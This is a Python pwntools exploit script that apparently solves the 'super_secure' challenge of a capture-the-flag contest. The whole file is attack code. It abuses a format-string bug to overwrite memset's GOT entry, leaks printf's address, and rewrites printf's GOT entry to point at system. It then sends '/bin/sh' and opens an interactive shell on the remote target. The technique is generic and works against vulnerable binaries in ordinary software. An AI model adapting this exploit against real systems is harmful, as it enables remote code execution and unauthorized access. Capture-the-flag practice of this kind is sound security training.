#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]
context.binary = './super_secure'

elf = context.binary
if argv[1] == 'l':
	io = process('./super_secure')
	libc = elf.libc
else:
	io = remote('problem1.tjctf.org', 8009)
	libc = ELF('./libc6_2.27-3ubuntu1_amd64.so')

def DEBUG():
	gdb.attach(io,'b *0x400c60\nb *0x400CD5\nc\n')

def mysend(payload,flag=False):

	io.sendlineafter("> ","s")
	io.sendlineafter(":\n","111111")
	io.sendlineafter(":\n",payload)
	
	io.sendlineafter("> ","v")
	io.sendlineafter(":\n","111111")
	if not flag:
		io.sendline("f**kyo")

def set_to_memset():
	
	payload = ("%{}c%{}$hn".format(elf.sym["_start"]&0xffff,28)).ljust(16,'+') + p64(elf.got['memset'])
	mysend(payload)

def leak(addr):

	payload = "++%27$s+" + p64(addr)
	mysend(payload)

	io.recvuntil("++")
	real_addr = io.recvuntil("+")[:-1]
	real_addr = u64( real_addr + "\x00"*(8-len(real_addr)) )

	print hex(real_addr)
	return real_addr 

def printf_to_system(printf_addr):

	system_addr = libc.sym['system'] + printf_addr - libc.sym['printf']
	print hex(system_addr),hex(printf_addr)

	payload = ("%{}c%30$hhn".format(system_addr&0xff)).ljust(16,'+')
	payload += ("%{}c%31$hn".format( ((system_addr>>8)&0xffff) - (system_addr&0xff) - 5 )).ljust(16,'+')
	payload += p64( elf.got['printf'] ) + p64( elf.got['printf']+1 )
	info(payload)
#DEBUG()
	mysend(payload)
	
	io.sendline("s")
	io.sendline("111111")
	io.sendline("/bin/sh\0")

	io.sendline("v")
	io.sendline("111111")

if __name__ == "__main__":
	
	set_to_memset()
	printf_addr = leak(elf.got['printf'])
	
	printf_to_system(printf_addr)

	io.interactive()

